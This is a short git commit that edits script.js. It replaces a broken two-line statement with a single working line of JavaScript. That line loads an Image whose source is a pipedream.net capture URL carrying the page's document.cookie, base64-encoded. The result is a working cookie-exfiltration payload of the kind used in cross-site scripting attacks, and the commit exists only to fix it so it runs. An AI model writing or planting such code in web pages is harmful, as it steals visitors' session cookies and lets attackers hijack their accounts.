bda479692d68470bc9ecb35f4aafb57e7076fe4f
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 15:33:10 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://eo701wwoc4t6b3g.m.pipedream.net?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://eo701wwoc4t6b3g.m.pipedream.net?data='+btoa(document.cookie);
